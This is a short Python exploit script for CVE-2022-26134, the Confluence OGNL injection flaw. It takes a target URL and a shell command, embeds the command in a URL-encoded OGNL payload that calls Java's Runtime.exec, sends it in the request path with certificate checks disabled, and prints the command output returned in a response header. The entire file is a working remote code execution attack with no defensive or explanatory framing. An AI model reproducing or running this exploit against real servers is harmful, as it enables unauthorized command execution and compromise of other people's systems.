from urllib.parse import quote
import requests
import sys
from requests.packages import urllib3
from rich.console import Console

#cve_2022_26134
#author : ys jhonson le wanna
#email : wannaajhonson@gmail.com
#facebook : ys jhonson le wannaa

urllib3.disable_warnings()

cmd =sys.argv[2]
url = sys.argv[1]




mom = f'/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22{cmd}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/'

headers ={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
        "Connection": "close",
        "Accept-Encoding": "gzip, deflate",
    }
    
if not 'https://' in url :
	parse = requests.get('https://'+url+mom, headers=headers, verify=False,allow_redirects=False)
else :
	parse = requests.get(url+mom, headers=headers, verify=False, allow_redirects=False)
	
if 'X-Cmd-Response' in parse.headers:
	v = parse.headers['X-Cmd-Response']
	print('\033[92m',v)
	
	
else :
	print('\033[91m' ,parse.url ,' ', 'Target Not vulnerable [+]')
	
	


#parse.headers['X-Cmd-Response'])





